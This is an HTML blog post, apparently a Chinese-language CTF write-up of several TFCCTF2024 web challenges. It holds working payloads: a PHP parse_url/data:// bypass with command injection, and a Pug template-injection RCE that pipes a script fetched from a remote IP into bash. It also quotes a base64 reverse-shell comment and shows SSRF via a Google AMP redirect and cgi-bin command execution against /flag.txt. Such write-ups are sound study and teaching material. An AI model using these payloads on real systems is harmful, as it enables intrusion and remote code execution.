@@ -1,0 +1,936 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  <link rel="icon" href="/images/favicon.ico">
+  
+  <title>TFCCTF2024 web方向部分题解 | Err0r233</title>
+  <meta name="author" content="Err0r2333" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    <meta name="keywords" content="Web" />
+  
+  <meta name="description" content="老外的比赛，涨姿势了">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TFCCTF2024 web方向部分题解">
+<meta property="og:url" content="http://example.com/posts/12526.html">
+<meta property="og:site_name" content="Err0r233">
+<meta property="og:description" content="老外的比赛，涨姿势了">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/favicon.ico">
+<meta property="article:published_time" content="2024-08-11T04:40:22.000Z">
+<meta property="article:modified_time" content="2024-08-11T05:24:21.113Z">
+<meta property="article:author" content="Err0r2333">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/favicon.ico">
+<meta name="twitter:site" content="@Err0r2333">
+  
+  <!-- 站点验证相关 -->
+  
+    
+    
+    
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" media="all"></script>
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-color-dark.min.css" media="(prefers-color-scheme: dark)"></script>
+    <script src="/js/kr-dark.min.js"></script>
+  
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" media="all"></script>
+  
+  
+  <link rel="stylesheet" id="fontawe-css" href="/vendors/font-awesome@4.7.0/css/font-awesome.min.css" media="all"></script>
+  <link rel="stylesheet" id="nprogress-css" href="/vendors/nprogress@0.2.0/nprogress.css" media="all"></script>
+  
+  
+    <link rel="stylesheet" href="/vendors/aplayer@1.10.1/dist/APlayer.min.css"></script>
+  
+  
+    <link rel="stylesheet" href="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"></script>
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="/vendors/jquery@3.6.0/dist/jquery.min.js"></script>
+  
+    <script src="/vendors/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+  
+  <style>
+    
+      .kratos-cover.kratos-cover-2 {
+        background-image: url('/images/banner3.png');
+      }
+    
+    
+      @media(min-width:768px) {
+        body.custom-background {
+          background-image: url('/images/bg_winter.jpg');
+        }
+      }
+    
+  </style>
+  
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Err0r233" type="application/atom+xml">
+</head>
+
+
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                    
+                                    
+                                        
+                                            <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
+                                        
+                                    
+                                        
+                                            <li><a href="/archives/"><i class="fa fa-file"></i>档案馆</a></li>
+                                        
+                                    
+                                        
+                                            <li><a href="/friends/"><i class="fa fa-paw"></i>好伙伴</a></li>
+                                        
+                                    
+                                        
+                                            <li>
+                                                <a><i class="fa fa-link"></i>链接</a>
+                                                <ul class="sub-menu">
+                                                    
+                                                        
+                                                    
+                                                </ul>
+                                            </li>
+                                        
+                                    
+                                
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo"><a href="/">Err0r233</a></div>
+                    <div class="nav-toggle">
+                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>Err0r233</h2> <br />
+                        <span>Err0r233的个人博客</span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+                    
+
+        
+
+        
+
+            <section class="col-md-8">
+
+        
+
+            <article itemscope itemtype="https://schema.org/Article">
+    
+    <link itemprop="mainEntityOfPage" href="http://example.com/posts/12526.html">
+    <div class="kratos-hentry kratos-post-inner clearfix">
+        <header class="kratos-entry-header">
+            
+                <h1 class="kratos-entry-title text-center" itemprop="name headline">TFCCTF2024 web方向部分题解</h1>
+            
+            
+            <ul class="kratos-post-meta text-center">
+                <li><time datetime="2024-08-11T04:40:22.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2024-08-11</time></li>
+                <li itemprop="author" itemscope itemtype="https://schema.org/Person">
+                    <i class="fa fa-user"></i> 作者 <span itemprop="name">Err0r2333</span>
+                </li>
+                <li>
+                    <i class="fa fa-edit"></i> 
+                    
+                    
+                        ~10.14K
+                    
+                    字
+                </li>
+                
+                    <li id="/posts/12526.html" class="leancloud_visitors" data-flag-title="TFCCTF2024 web方向部分题解">
+                        <i class="fa fa-eye"></i>
+                        <span class="leancloud-visitors-count"> </span> 次阅读
+                    </li>
+                    
+                
+            </ul>
+        </header>
+        <div class="kratos-post-content">
+            
+            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
+                <div class="icon"><i class="fa fa-warning"></i></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1723353861113"></time> 前，其中的内容可能需要更新。</p></div>
+            </div>
+            
+            
+            
+            <hr />
+            <div itemprop="articleBody"><p>老外的比赛，涨姿势了</p>
+<span id="more"></span>
+<h1><span id="safe_content"> safe_content</span></h1>
+<blockquote>
+<p>Our site has been breached. Since then we restricted the ips we can get files from. This should reduce our attack surface since no external input gets into our app. Is it safe ?</p>
+<p>For the source code, go to /src.php</p>
+</blockquote>
+<p>傻逼edge，上次das坑我一次了，这次又来。</p>
+<p>src.php如下，一个简单的判断</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAllowedIP</span>(<span class="params"><span class="variable">$url</span>, <span class="variable">$allowedHost</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$parsedUrl</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$parsedUrl</span> || !<span class="keyword">isset</span>(<span class="variable">$parsedUrl</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$parsedUrl</span>[<span class="string">&#x27;host&#x27;</span>] === <span class="variable">$allowedHost</span>;<span class="comment">//判断利用parse_url函数分割的url的host是否是本地地址</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fetchContent</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$context</span> = <span class="title function_ invoke__">stream_context_create</span>([</span><br><span class="line">            <span class="string">&#x27;http&#x27;</span> =&gt; [</span><br><span class="line">                <span class="string">&#x27;timeout&#x27;</span> =&gt; <span class="number">5</span> // Timeout in seconds</span><br><span class="line">            ]</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$content</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>, <span class="literal">false</span>, <span class="variable">$context</span>);<span class="comment">//ssrf</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$content</span> === <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            <span class="variable">$error</span> = <span class="title function_ invoke__">error_get_last</span>();</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Unable to fetch content from the URL. Error: &quot;</span> . <span class="variable">$error</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$content</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;GET&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">        <span class="variable">$allowedIP</span> = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">isAllowedIP</span>(<span class="variable">$url</span>, <span class="variable">$allowedIP</span>)) &#123;</span><br><span class="line">            <span class="variable">$content</span> = <span class="title function_ invoke__">fetchContent</span>(<span class="variable">$url</span>);</span><br><span class="line">            <span class="comment">// file upload removed due to security issues</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$content</span>) &#123;</span><br><span class="line">                <span class="variable">$command</span> = <span class="string">&#x27;echo &#x27;</span> . <span class="variable">$content</span> . <span class="string">&#x27; | base64 &gt; /tmp/&#x27;</span> . <span class="title function_ invoke__">date</span>(<span class="string">&#x27;YmdHis&#x27;</span>) . <span class="string">&#x27;.tfc&#x27;</span>;</span><br><span class="line">                <span class="comment">//echo YmFzaCAtaSA+Ji9kZXYvdGNwLzEwNi41Mi45NC4yMy8yMzMzIDA+JjE= | base64 -d| bash</span></span><br><span class="line">                <span class="title function_ invoke__">exec</span>(<span class="variable">$command</span> . <span class="string">&#x27; &gt; /dev/null 2&gt;&amp;1&#x27;</span>);</span><br><span class="line">                <span class="comment">// this should fix it</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>仔细看就知道逻辑是通过<code>fetchContent</code>来获取到指定url的内容，并且将得到的<code>content</code>放入<code>command</code>里执行。</p>
+<p>参考<a target="_blank" rel="noopener" href="https://err0r233.github.io/posts/22097.html">ctfshow周末大挑战 - parseurl | Err0r233</a>，我之前写过的<code>parse_url</code>可以得到host其实是这部分：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="comment">//u=http://username:password@host:8080/path?args=value#test</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">    输出结果：</span><br><span class="line"><span class="title function_ invoke__">Array</span> ( [scheme] =&gt; http [host] =&gt; host [port] =&gt; <span class="number">8080</span> [user] =&gt; username [pass] =&gt; password [path] =&gt; /path [query] =&gt; args=value )</span><br></pre></td></tr></table></figure>
+<p>第一时间想的是通过这个方式绕过然后打一个反弹shell，将<code>testshell</code>部署在vps上，通过这个ssrf来获取到反弹shell的内容，然后再执行反弹shell。</p>
+<p>但是很快就有个问题，那就是报错访问不到，难绷的。</p>
+<p>自己试着访问了一下发现会指向<code>localhost/testshell</code>，又因为本地根本没有这玩意，所以就报错了。</p>
+<p>这时候有点卡了，就去搜了一下<code>parse_url bypass file_get_contents</code></p>
+<p>发现这篇文章：</p>
+<p><a target="_blank" rel="noopener" href="https://medium.com/@themiddleblue/php-ssrf-techniques-9d422cb28d51">PHP SSRF Techniques. How to bypass filter_var()… | by theMiddle | Medium</a></p>
+<p>发现php中的data伪协议可以联动<code>parse_url</code>一起使用。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">parse_url</span>(<span class="string">&#x27;data://text/plain;base64,SSBsb3ZlIFBIUAo=google.com&#x27;</span>));</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">	[scheme] =&gt; data</span></span><br><span class="line"><span class="comment">	[host] =&gt; text</span></span><br><span class="line"><span class="comment">	[path] =&gt; /plain;base64,SSBsb3ZlIFBIUAo=google.com</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+<p>注意看这里的<code>host</code>就是<code>text</code>。这里php伪协议有个特性就是<strong>PHP doesn’t care about mime-type…</strong>，也就是说我们把<code>text</code>随便换成任意一个东西都可以得到和<code>text</code>一样的结果</p>
+<p>那就简单了，但是本题里返回的是b64解密的结果，所以我们要进行二次b64加密就可以了。</p>
+<p>本题经测试不出网，无法反弹shell，但是当前目录下有写权限，可以将结果写入到文件里查看</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`cat /flag.txt`&gt;test.txt</span><br></pre></td></tr></table></figure>
+<img src="/posts/12526/image-20240803133424451.png" class title="awa">
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;data://localhost/plain;base64,WUdOaGRDQXZabXhoWnk1MGVIUmdQblJsYzNRdWRIaDA=&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p>不要在他的访问框里提交，直接在url里提交即可，不要让他url编码了。执行后访问<code>/test.txt</code>即可：</p>
+<img src="/posts/12526/image-20240803133531274.png" class title="awa">
+<h1><span id="greetings"> greetings</span></h1>
+<blockquote>
+<p>Welcome to our ctf! Hope you enjoy it! Have fun</p>
+</blockquote>
+<img src="/posts/12526/image-20240805174212222.png" class title="awa">
+<p>express框架。输入1就返回hello 1，感觉和flask很像。</p>
+<img src="/posts/12526/image-20240805174238893.png" class title="awa">
+<p>express模板注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;7*7&#125;</span><br></pre></td></tr></table></figure>
+<img src="/posts/12526/image-20240805174348840.png" class title="awa">
+<img src="/posts/12526/image-20240805174444901.png" class title="awa">
+<p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;function()&#123;localLoad=global.process.mainModule.constructor._load;sh=localLoad(&quot;child_process&quot;).exec(&#x27;curl ip:port/xxx | bash&#x27;)&#125;()&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;<span class="keyword">function</span>(<span class="params"></span>)&#123;localLoad=<span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="property">constructor</span>.<span class="property">_load</span>;sh=<span class="title function_">localLoad</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;curl 106.52.94.23:6001/bash | bash&#x27;</span>)&#125;()&#125;</span><br></pre></td></tr></table></figure>
+<img src="/posts/12526/image-20240805174906878.png" class title="awa">
+<img src="/posts/12526/image-20240805174914982.png" class title="awa">
+<p>app.js</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> pug = <span class="built_in">require</span>(<span class="string">&#x27;pug&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8000</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;pug&#x27;</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, <span class="string">&#x27;./views&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/result&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// Get the username from the query string</span></span><br><span class="line">    <span class="keyword">const</span> username = req.<span class="property">query</span>.<span class="property">username</span> || <span class="string">&#x27;Guest&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Vulnerable Implementation</span></span><br><span class="line">    <span class="keyword">const</span> templateString = <span class="string">`</span></span><br><span class="line"><span class="string">doctype html</span></span><br><span class="line"><span class="string">html(lang=&quot;en&quot;)</span></span><br><span class="line"><span class="string">  head</span></span><br><span class="line"><span class="string">    meta(charset=&quot;UTF-8&quot;)</span></span><br><span class="line"><span class="string">    meta(name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;)</span></span><br><span class="line"><span class="string">    title Result</span></span><br><span class="line"><span class="string">    style.</span></span><br><span class="line"><span class="string">      body &#123;</span></span><br><span class="line"><span class="string">        font-family: &#x27;Arial&#x27;, sans-serif;</span></span><br><span class="line"><span class="string">        background-color: #f5f5dc; /* beige background */</span></span><br><span class="line"><span class="string">        color: #333;</span></span><br><span class="line"><span class="string">        display: flex;</span></span><br><span class="line"><span class="string">        justify-content: center;</span></span><br><span class="line"><span class="string">        align-items: center;</span></span><br><span class="line"><span class="string">        height: 100vh;</span></span><br><span class="line"><span class="string">        margin: 0;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">      .container &#123;</span></span><br><span class="line"><span class="string">        text-align: center;</span></span><br><span class="line"><span class="string">        background-color: #fff;</span></span><br><span class="line"><span class="string">        padding: 20px;</span></span><br><span class="line"><span class="string">        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);</span></span><br><span class="line"><span class="string">        border-radius: 8px;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">      h1 &#123;</span></span><br><span class="line"><span class="string">        color: #d7263d; /* pink color */</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">      p &#123;</span></span><br><span class="line"><span class="string">        font-size: 1.2em;</span></span><br><span class="line"><span class="string">        # pink color</span></span><br><span class="line"><span class="string">        color: #d7263d;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">      .button &#123;</span></span><br><span class="line"><span class="string">        background-color: #084c61; /* dark green color */</span></span><br><span class="line"><span class="string">        color: white;</span></span><br><span class="line"><span class="string">        padding: 10px 20px;</span></span><br><span class="line"><span class="string">        text-decoration: none;</span></span><br><span class="line"><span class="string">        border-radius: 5px;</span></span><br><span class="line"><span class="string">        font-size: 1em;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">  body</span></span><br><span class="line"><span class="string">    .container</span></span><br><span class="line"><span class="string">      h1 Welcome <span class="subst">$&#123;username&#125;</span>!</span></span><br><span class="line"><span class="string">      p Give me a username and I will say hello to you.</span></span><br><span class="line"><span class="string">    `</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Render the template without compiling</span></span><br><span class="line">    <span class="keyword">const</span> output = pug.<span class="title function_">render</span>(templateString);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Send the rendered HTML as the response</span></span><br><span class="line">    res.<span class="title function_">send</span>(output);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server is running at http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>flag:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TFCCTF&#123;a6afc419a8d18207ca9435a38cb64f42fef108ad2b24c55321be197b767f0409&#125;</span><br></pre></td></tr></table></figure>
+<h1><span id="surfing"> surfing</span></h1>
+<p>随便输什么东西都是这样：</p>
+<img src="/posts/12526/image-20240805175409631.png" class title="awa">
+<p>只有google开头才能够有响应。页面f12有提示</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--  Reminder ! Change creds for admin panel on localhost:8000  ! --&gt;</span>   </span><br></pre></td></tr></table></figure>
+<p>题目目的要让我们访问本地8000端口，但是url必须得用google开头。这里有点阻碍</p>
+<p>如果能让我们从google跳转到<code>localhost:8000</code>就好了</p>
+<p>找到一个很相似的题</p>
+<p><a target="_blank" rel="noopener" href="https://vicevirus.github.io/posts/report-google-wgmy-2023/">https://vicevirus.github.io/posts/report-google-wgmy-2023/</a></p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://google.com/amp/localhost:8000/</span><br></pre></td></tr></table></figure>
+<img src="/posts/12526/image-20240805185032168.png" class title="awa">
+<p>会报错，因为后面带了.png参数</p>
+<p>用锚点注释掉：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://google.com/amp/localhost:8000#</span><br></pre></td></tr></table></figure>
+<img src="/posts/12526/image-20240805185106153.png" class title="awa">
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://google.com/amp/localhost:8000/admin.php?username=admin&amp;password=admin#</span><br></pre></td></tr></table></figure>
+<img src="/posts/12526/image-20240805185200204.png" class title="awa">
+<p>这里如果将问号这些url编码一下就能过，也可以起一个间接跳转：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://google.com/amp/106.52.94.23:6001/ttt#</span><br></pre></td></tr></table></figure>
+<p>绷，google不允许ip跳转</p>
+<img src="/posts/12526/image-20240805190748463.png" class title="awa">
+<p>用ngork内网穿透出来即可。ngork自己上官网下载安装到vps上，然后启动隧道就行了，开哪个端口就写哪个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ngrok http --domain=key-right-ape.ngrok-free.app 6001</span><br></pre></td></tr></table></figure>
+<img src="/posts/12526/image-20240805190850642.png" class title="awa">
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TFCCTF&#123;18fd102247cb73e9f9acaa42801ad03cf622ca1c3689e4969affcb128769d0bc&#125;</span><br></pre></td></tr></table></figure>
+<h1><span id="funny"> funny</span></h1>
+<blockquote>
+<p>This challenge is HILARIOUS!</p>
+</blockquote>
+<p>附件下下来，index.php没有什么可以关注的。附件还给了<code>httpd.conf</code>，可能在暗示我们往apache的洞走，搜一下apache的洞先。</p>
+<img src="/posts/12526/image-20240806120019083.png" class title="awa">
+<p>查了下，ddos肯定不可能，解析洞是上传的问题，服务组件提权也不可能，剩下就剩路径穿越了，试试<code>/cgi-bin/</code>。爆403</p>
+<p>400:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br></pre></td></tr></table></figure>
+<p>怎么回事呢</p>
+<p>看这个<code>httpd.conf</code>发现了一行比较好玩的东西：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ScriptAlias /cgi-bin /usr/bin</span><br><span class="line">Action php-script /cgi-bin/php-cgi</span><br><span class="line">AddHandler php-script .php</span><br><span class="line"></span><br><span class="line">&lt;Directory /usr/bin&gt;</span><br><span class="line">    Order allow,deny</span><br><span class="line">    Allow from all</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure>
+<p>不懂这是什么，但是可以找ai问一下：</p>
+<img src="/posts/12526/1.jpg" class title="awa">
+<p>简单地说就是将<code>/usr/bin</code>下的东西映射到了<code>/cgi-bin</code>底下，此时我们可以通过<code>/cgi-bin</code>来调用<code>/usr/bin</code>下的东西，众所周知<code>/usr/bin</code>是放命令的地方，相当于可以rce：</p>
+<img src="/posts/12526/2.jpg" class title="awa">
+<blockquote>
+<p>当querystring中不包含没有解码的<code>=</code>号的情况下，要将querystring作为cgi的参数传入。</p>
+</blockquote>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challs.tfcctf.com:31858/cgi-bin/pr?/flag.txt</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><code>pr</code> 命令是一个 Unix 和 Linux 系统中的命令，用于将文本文件格式化为页码化的输出，通常用于打印。pr 命令可以对文本进行分页、添加页眉、页脚、调整列数等，以便于打印或查看。</p>
+<p>这里用pr的原因是pr的输出有换行。其他能执行但是不能输出。在响应包的时候，没有换行的话是不能够显示在body里的，而是显示在header里，数据又不符合http头格式，此时就会报错</p>
+</blockquote>
+<h1><span id="sagigram未完成"> sagigram(未完成)</span></h1>
